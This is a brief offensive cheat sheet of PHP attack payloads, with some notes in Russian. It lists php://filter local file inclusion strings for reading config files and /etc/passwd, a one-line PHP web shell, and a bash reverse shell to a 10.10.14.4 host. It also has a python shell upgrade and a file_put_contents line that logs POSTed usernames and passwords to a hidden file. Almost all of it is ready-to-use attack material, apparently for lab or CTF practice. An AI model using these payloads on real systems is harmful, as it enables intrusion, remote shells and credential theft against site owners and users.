# PHP

# PHP filter

php://filter/convert.base64-encode/resource=config

image.php?img=php://filter/convert.base64-encode/resource=/etc/passwd

image.php?img=php://filter/resource=/etc/passwd

# CMD
    <?php system($_REQUEST['pwn']); ?>

  inddex.php?pwn=ls

# ReverseShell

<?php system ('bash -c "bash -i >& /dev/tcp/10.10.14.4/4444 0>&1"'); ?>

python -c 'import pty;pty.spawn('/bin/bash')'
# Запись в файл переменных

file_put_contents(".max", $_POST['log'] . ":" . $_POST['pwd'] . "\n" , FILE_APPEND);

#PHP server

php -S 127.0.0.1:80 и запускаем ето в том каталоге где лежит файл php

Передача параметров - $1
